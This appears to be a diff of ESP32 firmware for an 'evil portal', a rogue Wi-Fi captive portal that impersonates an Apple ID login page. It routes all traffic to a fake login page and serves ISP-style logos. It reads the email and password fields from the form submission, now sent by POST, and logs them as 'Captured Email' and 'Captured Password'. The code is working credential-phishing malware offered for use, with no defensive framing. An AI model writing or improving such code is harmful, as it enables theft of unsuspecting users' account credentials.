@@ -1,9 +1,8 @@
 /* 
 to do
-  1.) use of POST instead of get 
-  2.) Use happy colors 4 more a more positive energy (for now try blue and peach) yellow, orange, pink, red, peach, light pink and lilac.
-  3. "Forgot Apple ID or Password" and "Create yours now" buttons need to be redirecred somwwhere
-  4. Continous Study >>> https://github.com/bigbrodude6119/flipper-zero-evil-portal/blob/main/esp32/EvilPortal/EvilPortal.ino
+  
+  1.) "Forgot Apple ID or Password" and "Create yours now" buttons need to be redirecred somwwhere
+  2.) Continous Study >>> https://github.com/bigbrodude6119/flipper-zero-evil-portal/blob/main/esp32/EvilPortal/EvilPortal.ino
 
 */
 
@@ -55,9 +54,12 @@ void setupServer() {
       request->send(LittleFS, "/index.html", "text/html");
   });
 
-  // Route to load style.css file
-  server.on("/all.mini.CSS", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send(LittleFS, "/style.css", "text/css");
+  // Serve images 
+  serve.on("/isplogo.png", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(LittleFS, "/isplogo.png", "image/png");
+  });
+  serve.on("/Kelogo.png", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(LittleFS, "/Kelogo.png", "image/png");
   });
 
   // Serve other pages
@@ -80,25 +82,23 @@ void setupServer() {
   // Handle unknown requests (default to index.html for captive portal)
   server.onNotFound([](AsyncWebServerRequest *request){
     request->send(LittleFS, "/index.html", "text/html");
-  
   });
 
-  // Receive and process user input (Backend handling)
-    // Retrive via GET changing to POST soon
-  server.on("/get", HTTP_GET, [] (AsyncWebServerRequest *request) {
+  // Receive and process user input (Backend handling)  
+  server.on("/post", HTTP_POST , [] (AsyncWebServerRequest *request) {
     String inputMessage;
     
     // Capture email
-    if (request->hasParam("email")) {
-      inputMessage = request->getParam("email")->value();
+    if (request->hasParam("email", true)) {
+      inputMessage = request->getParam("email", true)->value(); //the true makes it read from the POST body n0t url
       email = inputMessage;
       Serial.println("Captured Email: " + inputMessage);
       email_received = true;
     }
     
     // Capture Passwd
-    if (request->hasParam("passwd")) {
-      inputMessage = request->getParam("passwd")->value();
+    if (request->hasParam("passwd", true)) {
+      inputMessage = request->getParam("passwd", true)->value();
       passwd = inputMessage;
       Serial.println("Captured Password: " + inputMessage);
       passwd_received = true;
